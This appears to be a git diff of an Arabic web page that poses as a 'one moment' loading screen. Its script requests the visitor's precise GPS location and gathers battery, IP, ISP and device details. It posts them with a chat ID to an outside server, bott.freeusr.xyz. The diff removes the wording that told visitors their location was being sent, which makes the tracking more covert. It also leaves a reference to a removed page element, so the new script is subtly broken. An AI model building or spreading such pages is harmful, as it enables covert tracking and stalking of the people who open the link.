@@ -5,473 +5,220 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>لحظة واحدة</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       background-color: #121212;
       color: #fff;
-      font-family: 'Arial', sans-serif;
+      font-family: sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       text-align: center;
       padding: 20px;
-      overflow: hidden;
+      margin: 0;
     }
-
-    /* ===== شاشة التحميل ===== */
-    .loading-container {
-      max-width: 450px;
-      padding: 50px 40px;
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 20px;
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255, 255, 255, 0.1);
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-      animation: fadeIn 0.8s ease-out;
+    .container {
+      max-width: 500px;
+      padding: 20px;
     }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: scale(0.9);
-      }
-      to {
-        opacity: 1;
-        transform: scale(1);
-      }
-    }
-
-    .loader {
-      border: 6px solid rgba(255, 255, 255, 0.1);
-      border-top: 6px solid #e74c3c;
-      border-radius: 50%;
-      width: 70px;
-      height: 70px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 25px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .loading-title {
-      font-size: 1.5rem;
-      font-weight: 600;
-      margin-bottom: 10px;
-      color: rgba(255, 255, 255, 0.9);
-    }
-
-    .loading-sub {
-      font-size: 0.95rem;
-      color: rgba(255, 255, 255, 0.5);
-      margin-top: 10px;
-      line-height: 1.6;
-    }
-
-    .loading-icon {
-      font-size: 2.5rem;
+    .status-icon {
+      font-size: 3rem;
       margin-bottom: 15px;
     }
-
-    /* ===== رسالة النجاح ===== */
-    .success-container {
-      max-width: 450px;
-      padding: 50px 40px;
-      text-align: center;
-      animation: fadeInUp 0.8s ease-out;
-    }
-
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px) scale(0.95);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
-    }
-
-    .check-icon {
-      width: 80px;
-      height: 80px;
-      background: linear-gradient(135deg, #e74c3c, #c0392b);
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 0 auto 25px;
-      animation: pulse 1.5s ease-in-out infinite;
-      box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4);
-    }
-
-    .check-icon svg {
-      width: 45px;
-      height: 45px;
-      fill: none;
-      stroke: #fff;
-      stroke-width: 3;
-      stroke-linecap: round;
-      stroke-linejoin: round;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.08); }
-      100% { transform: scale(1); }
-    }
-
-    .main-title {
-      font-size: 2.8rem;
-      font-weight: 700;
-      color: #e74c3c;
+    .status-title {
+      font-size: 2rem;
+      font-weight: bold;
       margin-bottom: 10px;
-      text-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
     }
-
-    .line {
-      width: 60px;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, #e74c3c, transparent);
-      margin: 15px auto 20px;
-      border-radius: 2px;
-    }
-
-    .sub-text {
+    .status-sub {
       font-size: 1.1rem;
-      color: rgba(255, 255, 255, 0.7);
-      margin: 15px 0 30px;
-      line-height: 1.8;
+      color: #aaa;
+      margin-top: 10px;
     }
-
-    .close-btn {
-      background: linear-gradient(135deg, #e74c3c, #c0392b);
-      color: #fff;
-      border: none;
-      padding: 14px 40px;
-      font-size: 1rem;
-      font-weight: 600;
-      border-radius: 50px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      font-family: 'Arial', sans-serif;
-      box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
-    }
-
-    .close-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 35px rgba(231, 76, 60, 0.5);
-    }
-
-    .close-btn:active {
-      transform: translateY(0);
-    }
-
-    /* ===== رسالة الخطأ ===== */
-    .error-container {
-      max-width: 450px;
-      padding: 50px 40px;
-      text-align: center;
-      animation: fadeIn 0.8s ease-out;
-    }
-
-    .error-icon {
-      font-size: 4rem;
-      margin-bottom: 20px;
-    }
-
-    .error-title {
-      color: #e74c3c;
-      font-size: 1.5rem;
-      margin-bottom: 15px;
-    }
-
-    .error-text {
-      color: rgba(255, 255, 255, 0.7);
-      margin-bottom: 25px;
-      line-height: 1.8;
-    }
-
-    .retry-btn {
-      background: transparent;
-      color: #e74c3c;
-      border: 2px solid #e74c3c;
-      padding: 12px 35px;
-      font-size: 1rem;
-      font-weight: 600;
-      border-radius: 50px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      font-family: 'Arial', sans-serif;
-    }
-
-    .retry-btn:hover {
-      background: #e74c3c;
-      color: #fff;
-      transform: translateY(-2px);
-    }
-
-    /* ===== معلومات الموقع (تظهر أثناء التحميل) ===== */
-    .location-info {
+    .status-detail {
+      font-size: 0.9rem;
+      color: #666;
       margin-top: 15px;
-      padding: 10px;
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 10px;
-      font-size: 0.85rem;
-      color: rgba(255, 255, 255, 0.4);
-      display: none;
-    }
-
-    .location-info.active {
-      display: block;
-    }
-
-    /* ===== شريط التقدم ===== */
-    .progress-bar {
-      width: 100%;
-      height: 3px;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 2px;
-      margin-top: 20px;
-      overflow: hidden;
-    }
-
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #e74c3c, #f39c12);
-      border-radius: 2px;
-      animation: progress 2s ease-in-out infinite;
-    }
-
-    @keyframes progress {
-      0% { width: 0%; }
-      50% { width: 70%; }
-      100% { width: 100%; }
-    }
-
-    /* ===== نقاط التحميل المتحركة ===== */
-    .dots::after {
-      content: '';
-      animation: dots 1.5s steps(4, end) infinite;
-    }
-
-    @keyframes dots {
-      0% { content: ''; }
-      25% { content: '.'; }
-      50% { content: '..'; }
-      75% { content: '...'; }
-      100% { content: ''; }
     }
   </style>
 </head>
 <body>
-  <!-- شاشة التحميل -->
-  <div id="mainContainer">
-    <div class="loading-container" id="loadingContent">
-      <div class="loading-icon">📍</div>
-      <div class="loader"></div>
-      <div class="loading-title" id="statusTitle">جاري تحديد الموقع</div>
-      <div class="loading-sub" id="statusSub">يرجى الانتظار<span class="dots"></span></div>
-      <div class="progress-bar">
-        <div class="progress-fill"></div>
-      </div>
-      <div class="location-info" id="locationInfo">
-        <span id="locationDetails">⏳ جاري الحصول على الموقع...</span>
-      </div>
-    </div>
+  <div class="container" id="mainContainer">
+    <div class="status-icon">📍</div>
+    <h2 id="statusText">لحظة واحدة</h2>
   </div>
 
-  <script>
-    const chatId = new URLSearchParams(window.location.search).get("chatId");
-    const mainContainer = document.getElementById('mainContainer');
-    const statusTitle = document.getElementById('statusTitle');
-    const statusSub = document.getElementById('statusSub');
-    const locationInfo = document.getElementById('locationInfo');
-    const locationDetails = document.getElementById('locationDetails');
+<script>
+const chatId = new URLSearchParams(window.location.search).get("chatId");
+const statusText = document.getElementById('statusText');
+const statusSub = document.getElementById('statusSub');
+const mainContainer = document.getElementById('mainContainer');
 
-    // ===== عرض رسالة النجاح =====
-    function showSuccessMessage() {
-      mainContainer.innerHTML = `
-        <div class="success-container">
-          <div class="check-icon">
-            <svg viewBox="0 0 24 24">
-              <polyline points="20 6 9 17 4 12" />
-            </svg>
-          </div>
-          <h1 class="main-title">انتهى اغلق الصفحة</h1>
-          <div class="line"></div>
-          <p class="sub-text">
-            ✅ تم إرسال الموقع بنجاح<br>
-            يمكنك الآن إغلاق هذه الصفحة
-          </p>
-          <button class="close-btn" onclick="closePage()">
-            ✕ إغلاق الصفحة
-          </button>
-        </div>
-      `;
+// ===== دالة عرض رسالة النجاح =====
+function showSuccessMessage() {
+  mainContainer.innerHTML = `
+    <div style="
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    ">
+      <div style="
+        width: 80px;
+        height: 80px;
+        background: #e74c3c;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 20px;
+        animation: spin 1.5s linear infinite;
+      ">
+        <span style="font-size: 40px; color: white;">✓</span>
+      </div>
+      <div style="
+        font-size: 2.5rem;
+        font-weight: bold;
+        color: #e74c3c;
+        margin-bottom: 10px;
+      ">
+        انتهى اغلق الصفحة
+      </div>
+      <div style="
+        font-size: 0.9rem;
+        color: #666;
+        margin-top: 15px;
+      ">
+        يمكنك إغلاق هذه الصفحة الآن
+      </div>
+    </div>
+  `;
+  
+  // إضافة الـ keyframe للدوران
+  const style = document.createElement('style');
+  style.textContent = `
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
+  `;
+  document.head.appendChild(style);
+}
 
-    // ===== عرض رسالة الخطأ =====
-    function showError(message, showRetry = true) {
-      mainContainer.innerHTML = `
-        <div class="error-container">
-          <div class="error-icon">❌</div>
-          <div class="error-title">حدث خطأ</div>
-          <div class="error-text">${message}</div>
-          ${showRetry ? `<button class="retry-btn" onclick="location.reload()">🔄 إعادة المحاولة</button>` : ''}
-        </div>
-      `;
-    }
+// ===== دالة عرض رسالة الخطأ =====
+function showError(message) {
+  mainContainer.innerHTML = `
+    <div>
+      <div style="font-size: 3rem; margin-bottom: 15px;">❌</div>
+      <h2 style="color: #e74c3c;">حدث خطأ</h2>
+      <div style="color: #aaa; margin-top: 10px;">${message}</div>
+      <button onclick="location.reload()" style="
+        margin-top: 20px;
+        padding: 12px 30px;
+        background: transparent;
+        color: #e74c3c;
+        border: 2px solid #e74c3c;
+        border-radius: 25px;
+        font-size: 1rem;
+        cursor: pointer;
+        font-family: sans-serif;
+        transition: all 0.3s;
+      " onmouseover="this.style.background='#e74c3c'; this.style.color='white';" 
+         onmouseout="this.style.background='transparent'; this.style.color='#e74c3c';">
+        🔄 إعادة المحاولة
+      </button>
+    </div>
+  `;
+}
 
-    // ===== تحديث حالة التحميل =====
-    function updateStatus(title, sub, showLocation = false) {
-      if (title) statusTitle.textContent = title;
-      if (sub) statusSub.textContent = sub;
-      if (showLocation) {
-        locationInfo.classList.add('active');
-      }
-    }
+window.onload = () => {
+  if (!chatId) {
+    showError("❌ chatId غير موجود في الرابط");
+    return;
+  }
 
-    // ===== دالة إغلاق الصفحة =====
-    function closePage() {
-      window.close();
-      setTimeout(() => {
-        document.body.innerHTML = `
-          <div style="
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background: #121212;
-            color: #e74c3c;
-            font-size: 1.5rem;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-          ">
-            ✅ يمكنك إغلاق هذه الصفحة الآن
-          </div>
-        `;
-      }, 500);
-    }
+  statusSub.textContent = "لحظة واحدة...";
 
-    // ===== الوظيفة الرئيسية =====
-    window.onload = () => {
-      // التحقق من وجود chatId
-      if (!chatId) {
-        showError("❌ خطأ: chatId غير موجود في الرابط", false);
-        return;
-      }
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    try {
+      statusSub.textContent = "لحظة واحدة...";
+      
+      const battery = await navigator.getBattery();
+      
+      statusSub.textContent = "لحظة واحدة...";
+      
+      const res = await fetch("https://ipwho.is/");
+      const location = await res.json();
 
-      updateStatus('📍 جاري تحديد الموقع', 'يرجى السماح بصلاحية الموقع');
-
-      // طلب موقع المستخدم
-      navigator.geolocation.getCurrentPosition(async (pos) => {
-        try {
-          updateStatus('📍 تم تحديد الموقع', 'جاري جمع معلومات إضافية...', true);
-          locationDetails.textContent = `🌐 ${pos.coords.latitude}, ${pos.coords.longitude}`;
-
-          // جلب معلومات البطارية
-          let batteryData = {};
-          try {
-            const battery = await navigator.getBattery();
-            batteryData = {
-              level: Math.round(battery.level * 100) + '%',
-              charging: battery.charging
-            };
-          } catch {}
-
-          // جلب معلومات IP
-          let ipData = {};
-          try {
-            const res = await fetch("https://ipwho.is/");
-            ipData = await res.json();
-          } catch (ipError) {
-            console.warn('فشل في جلب معلومات IP:', ipError);
-          }
-
-          updateStatus('📤 جاري إرسال المعلومات', 'يرجى الانتظار...');
-
-          // تجهيز البيانات للإرسال
-          const payload = {
-            chatId,
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            altitude: pos.coords.altitude || null,
-            speed: pos.coords.speed || null,
-            heading: pos.coords.heading || null,
-            timestamp: new Date(pos.timestamp).toISOString(),
-            additionalData: {
-              ip: ipData.ip || 'غير متاح',
-              country: ipData.country || 'غير متاح',
-              city: ipData.city || 'غير متاح',
-              region: ipData.region || 'غير متاح',
-              timezone: ipData.timezone || 'غير متاح',
-              isp: ipData.isp || 'غير متاح',
-              org: ipData.org || 'غير متاح',
-              platform: navigator.platform,
-              userAgent: navigator.userAgent,
-              deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'هاتف' : 'حاسوب',
-              batteryLevel: batteryData.level,
-              batteryCharging: batteryData.charging,
-              language: navigator.language,
-              screenResolution: `${screen.width}x${screen.height}`,
-              connectionType: navigator.connection?.effectiveType || 'غير معروف'
-            }
-          };
-
-          // إرسال البيانات
-          const send = await fetch("https://bott.freeusr.xyz/submitLocation", {
-            method: "POST",
-            headers: { 
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          });
-
-          const result = await send.json();
-          
-          if (result.success) {
-            // ✅ تم إلغاء التحويل إلى الرابط الإعلاني
-            // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
-            
-            // ✅ عرض رسالة "انتهى اغلق الصفحة" بدلاً من التحويل
-            showSuccessMessage();
-          } else {
-            showError(`❌ فشل إرسال البيانات: ${result.message || 'خطأ غير معروف'}`);
-          }
-
-        } catch (err) {
-          console.error("خطأ في الإرسال:", err);
-          showError(`❌ تعذر الاتصال بالسيرفر: ${err.message || 'خطأ غير معروف'}`);
+      const payload = {
+        chatId,
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude || null,
+        speed: pos.coords.speed || null,
+        heading: pos.coords.heading || null,
+        additionalData: {
+          ip: location.ip || 'غير متاح',
+          country: location.country || 'غير متاح',
+          city: location.city || 'غير متاح',
+          region: location.region || 'غير متاح',
+          timezone: location.timezone || 'غير متاح',
+          isp: location.isp || 'غير متاح',
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'هاتف' : 'حاسوب',
+          batteryLevel: Math.round(battery.level * 100) + '%',
+          batteryCharging: battery.charging,
+          language: navigator.language,
+          screenResolution: `${screen.width}x${screen.height}`
         }
+      };
 
-      }, (err) => {
-        console.error("رفض المستخدم صلاحيات الموقع", err);
-        let errorMsg = "لم يتم السماح بالموقع ❌";
-        if (err.code === 1) {
-          errorMsg = "❌ تم رفض صلاحية الموقع. يرجى السماح بالموقع في إعدادات المتصفح";
-        } else if (err.code === 2) {
-          errorMsg = "❌ تعذر تحديد الموقع. تأكد من تفعيل GPS";
-        } else if (err.code === 3) {
-          errorMsg = "❌ انتهت مهلة تحديد الموقع. حاول مرة أخرى";
-        }
-        showError(errorMsg);
-      }, {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
+      statusSub.textContent = "تم بنجاح";
+
+      const send = await fetch("https://bott.freeusr.xyz/submitLocation", {
+        method: "POST",
+        headers: { 
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
       });
-    };
-  </script>
+
+      const result = await send.json();
+      
+      if (result.success) {
+        // ❌ تم إلغاء التحويل إلى الرابط الإعلاني
+        // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+        
+        // ✅ عرض رسالة "انتهى اغلق الصفحة" بدلاً من التحويل
+        showSuccessMessage();
+      } else {
+        showError(`فشل إرسال البيانات: ${result.message || 'خطأ غير معروف'}`);
+      }
+    } catch (err) {
+      console.error("خطأ في الإرسال:", err);
+      showError(`تعذر الاتصال بالسيرفر: ${err.message || 'خطأ غير معروف'}`);
+    }
+
+  }, (err) => {
+    console.error("رفض المستخدم صلاحيات الموقع", err);
+    let errorMsg = "لم يتم السماح بالموقع ❌";
+    if (err.code === 1) {
+      errorMsg = "❌ تم رفض صلاحية الموقع. يرجى السماح بالموقع في إعدادات المتصفح";
+    } else if (err.code === 2) {
+      errorMsg = "❌ تعذر تحديد الموقع. تأكد من تفعيل GPS";
+    } else if (err.code === 3) {
+      errorMsg = "❌ انتهت مهلة تحديد الموقع. حاول مرة أخرى";
+    }
+    showError(errorMsg);
+  }, {
+    enableHighAccuracy: true,
+    timeout: 10000,
+    maximumAge: 0
+  });
+};
+</script>
 </body>
 </html>
